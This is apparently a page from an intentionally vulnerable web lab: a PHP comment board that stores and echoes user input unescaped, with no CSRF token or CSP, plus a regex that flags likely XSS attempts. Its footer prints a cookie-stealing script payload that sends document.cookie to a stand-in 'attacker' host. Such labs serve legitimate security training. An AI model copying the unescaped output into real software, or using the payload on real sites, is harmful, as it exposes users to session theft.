<?php
// Vuln 8: Stored XSS - no output encoding

$db = new SQLite3('/var/www/db/comments.db');
$db->exec("CREATE TABLE IF NOT EXISTS comments (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    author TEXT,
    text TEXT,
    ip TEXT,
    created_at TEXT
)");

function write_log($msg) {
    $ts = date('Y-m-d H:i:s');
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    file_put_contents('/var/log/vuln-lab/xss_attempts.log',
        "[$ts] IP=$ip | $msg\n", FILE_APPEND);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $author = $_POST['author'] ?? 'Anonymous';
    $text   = $_POST['text'] ?? '';
    $ip     = $_SERVER['REMOTE_ADDR'] ?? '';
    $ts     = date('Y-m-d H:i:s');

    // Log raw input - useful for detecting XSS attempts
    write_log("COMMENT | author='$author' | text='$text'");

    // Detect obvious XSS attempts in log
    if (preg_match('/<script|javascript:|onerror|onload|alert\s*\(/i', $text)) {
        write_log("ALERT: Possible XSS detected! text='$text'");
    }

    // VULNERABLE: Store raw input without sanitization
    $stmt = $db->prepare("INSERT INTO comments (author, text, ip, created_at) VALUES (?, ?, ?, ?)");
    $stmt->bindValue(1, $author);
    $stmt->bindValue(2, $text);   // No sanitization
    $stmt->bindValue(3, $ip);
    $stmt->bindValue(4, $ts);
    $stmt->execute();
}

$comments = $db->query("SELECT * FROM comments ORDER BY id DESC");
?>
<!DOCTYPE html>
<html>
<head>
    <title>Comments</title>
    <!-- Vuln: No Content-Security-Policy header -->
    <style>
        body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
        .comment { border: 1px solid #333; padding: 10px; margin: 10px 0; }
        input, textarea { background: #333; color: #fff; border: 1px solid #555; padding: 8px; width: 300px; }
        button { background: #444; color: #0f0; border: 1px solid #0f0; padding: 8px 20px; }
        .meta { color: #888; font-size: 0.8em; }
    </style>
</head>
<body>
<h2>Comments (Stored XSS)</h2>

<!-- Vuln: No CSRF token -->
<form method="POST">
    <div>Name: <input name="author" placeholder="Your name"></div>
    <div>Comment: <textarea name="text" rows="4" placeholder="Tulis komen..."></textarea></div>
    <div><button type="submit">Post</button></div>
</form>

<h3>All Comments:</h3>
<?php while ($row = $comments->fetchArray(SQLITE3_ASSOC)): ?>
<div class="comment">
    <!-- VULNERABLE: Raw output, no htmlspecialchars -->
    <strong><?= $row['author'] ?></strong>
    <span class="meta"> | <?= $row['ip'] ?> | <?= $row['created_at'] ?></span>
    <p><?= $row['text'] ?></p>
</div>
<?php endwhile; ?>

<hr>
<small>
    XSS test: <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code><br>
    XSS steal cookie: <code>&lt;script&gt;fetch('http://attacker/?c='+document.cookie)&lt;/script&gt;</code>
</small>
</body>
</html>
